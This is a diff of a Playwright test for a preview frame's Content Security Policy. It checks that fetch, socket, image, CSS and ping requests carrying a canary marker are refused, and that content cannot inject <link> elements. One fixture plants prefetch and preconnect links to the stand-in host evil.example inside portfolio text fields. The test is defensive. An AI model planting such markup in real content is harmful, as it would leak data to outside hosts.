@@ -103,8 +103,13 @@ interface Captured {
   answered: boolean;
 }
 
-/** What a CSP-blocked load fails with: the browser refused it, and nothing went out. */
-const BLOCKED = 'net::ERR_BLOCKED_BY_CSP';
+/**
+ * What a CSP-blocked load fails with: the browser refused it, and nothing
+ * went out. Chromium reports net::ERR_BLOCKED_BY_CSP, and Playwright's
+ * `failure().errorText` gives it as `csp` for a subresource the policy
+ * blocked, as the image, the CSS url(), and the ping are.
+ */
+const BLOCKED: ReadonlySet<string> = new Set(['net::ERR_BLOCKED_BY_CSP', 'csp']);
 
 /**
  * Every captured request that carries one of `markers` and wasn't refused by
@@ -113,12 +118,16 @@ const BLOCKED = 'net::ERR_BLOCKED_BY_CSP';
  * `requestfailed` with net::ERR_BLOCKED_BY_CSP, and never reaches a server.
  */
 function escaped(requests: readonly Captured[], markers: readonly string[]): string[] {
-  return requests
-    .filter(({ text }) => markers.some((marker) => text.includes(marker)))
-    .filter(({ failure, answered }) => answered || failure !== BLOCKED)
-    .map(
-      ({ url, failure, answered }) => `${url} (${answered ? 'answered' : (failure ?? 'pending')})`,
-    );
+  return (
+    requests
+      .filter(({ text }) => markers.some((marker) => text.includes(marker)))
+      // Left: it got a response or finished, or failed some way other than the policy's refusal.
+      .filter(({ failure, answered }) => answered || failure === null || !BLOCKED.has(failure))
+      .map(
+        ({ url, failure, answered }) =>
+          `${url} (${answered ? 'answered' : (failure ?? 'pending')})`,
+      )
+  );
 }
 
 /** Waits until every captured request carrying one of `markers` has failed or been answered. */
@@ -310,7 +319,9 @@ test(
       { origin: app.origin, host, remote: REMOTE, marker, hosts: HOSTS },
     );
     // fetch and the image fail, the sockets never open, and whatever a beacon queued never left.
-    expect(outcomes).toMatchObject({
+    // Soft, as each row of the violation table below is, so a policy that lets one through shows
+    // every case it breaks, not only the first.
+    expect.soft(outcomes).toMatchObject({
       'fetch, own origin': 'refused',
       'fetch, remote': 'refused',
       'socket, own origin': 'refused',
@@ -323,13 +334,15 @@ test(
     // can't add one (the next test), so the script would be the agent's or a
     // registered composition's, which the owner chose (threat preview-7).
     const prefetched = (url: string) => /\/__canary\/prefetch(?:-own)?\?/.test(url);
-    expect([...hits].sort(), 'only the two prefetches reached a server').toEqual(
-      [
-        `${app.origin}/__canary/prefetch-own?${marker}`,
-        `https://${HOSTS.prefetch}/__canary/prefetch?${marker}`,
-      ].sort(),
-    );
-    expect(blockedRequests.filter((url) => url.includes(marker))).toEqual([]);
+    expect
+      .soft([...hits].sort(), 'only the two prefetches reached a server')
+      .toEqual(
+        [
+          `${app.origin}/__canary/prefetch-own?${marker}`,
+          `https://${HOSTS.prefetch}/__canary/prefetch?${marker}`,
+        ].sort(),
+      );
+    expect.soft(blockedRequests.filter((url) => url.includes(marker))).toEqual([]);
     // Every other request the browser began with the marker was refused by
     // the policy before it left: it failed with net::ERR_BLOCKED_BY_CSP, and
     // got no response and never finished.
@@ -337,13 +350,15 @@ test(
       requests.filter(({ url }) => !prefetched(url)),
       [marker],
     );
-    expect(
-      escaped(
-        requests.filter(({ url }) => !prefetched(url)),
-        [marker],
-      ),
-      'a request with the marker that left',
-    ).toEqual([]);
+    expect
+      .soft(
+        escaped(
+          requests.filter(({ url }) => !prefetched(url)),
+          [marker],
+        ),
+        'a request with the marker that left',
+      )
+      .toEqual([]);
     // And the frame's policy is what stopped each, which shows each was tried:
     // connect-src for both sockets, the fetches, and the ping, and img-src for
     // the image and the CSS url().
@@ -358,10 +373,12 @@ test(
       ['the CSS url()', /^img-src blocked /, HOSTS.css],
       ['the ping', /^connect-src blocked /, HOSTS.ping],
     ] as const) {
-      expect(
-        stopped(directive, needle),
-        `${what} was tried, and the policy stopped it:\n${seen.join('\n')}`,
-      ).toBe(true);
+      expect
+        .soft(
+          stopped(directive, needle),
+          `${what} was tried, and the policy stopped it:\n${seen.join('\n')}`,
+        )
+        .toBe(true);
     }
     expect(dialogs).toEqual([]);
     expect(errors).toEqual([]);
@@ -423,8 +440,8 @@ test(
 
     // The import's hostile fixtures that import render inert: nothing runs,
     // and nothing they plant reaches an element, an attribute, or a request.
-    // Link markup in Markdown and plain-text fields: no <link> element in the frame but its own
-    // stylesheets, so content can't start a prefetch (threat preview-7).
+    // Link markup in Markdown and plain-text fields: no <link> element content could have
+    // put there, so content can't start a prefetch (threat preview-7).
     const LINKS = `<link rel="prefetch" href="https://evil.example/${H.CANARY}-prefetch"> <link rel=preconnect href=//evil.example/${H.CANARY}>`;
     const linked = H.portfolioWith((data) => {
       (data.practice as Record<string, unknown>).thesis = `Before ${LINKS} after.`;
@@ -432,14 +449,30 @@ test(
       (data.identity as Record<string, unknown>).tagline = LINKS;
     });
     expect(await send(page, documentOf(H.pairFiles(linked)))).toEqual({ state: 'ready' });
+    const links = await frame.evaluate(() =>
+      [...document.querySelectorAll('link')].map((link) => ({
+        html: link.outerHTML,
+        rel: link.rel.toLowerCase().trim(),
+        href: link.getAttribute('href') ?? '',
+      })),
+    );
+    // The frame's own links alone: a stylesheet, a preload, or a module
+    // preload of one of the build's files, under /_next/static/ or
+    // /_portfolio/ on the frame's own origin. Any other link, a prefetch or a
+    // preconnect above all, is one content could have put there.
     expect(
-      await frame.evaluate(() =>
-        [...document.querySelectorAll('link')]
-          .filter(
-            (link) => link.rel !== 'stylesheet' || !link.getAttribute('href')?.startsWith('/'),
-          )
-          .map((link) => link.outerHTML),
-      ),
+      links
+        .filter(
+          ({ rel, href }) =>
+            !/^(?:stylesheet|preload|modulepreload)$/.test(rel) ||
+            !/^\/(?:_next\/static|_portfolio)\//.test(href),
+        )
+        .map(({ html }) => html),
+      "a link that isn't the frame's own",
+    ).toEqual([]);
+    expect(
+      links.filter(({ html }) => html.includes('evil.example') || html.includes(H.CANARY)),
+      'a link naming a planted host or value',
     ).toEqual([]);
 
     const fixtures = H.HOSTILE_FIXTURES.filter(({ expect: outcome }) => outcome === 'imported');
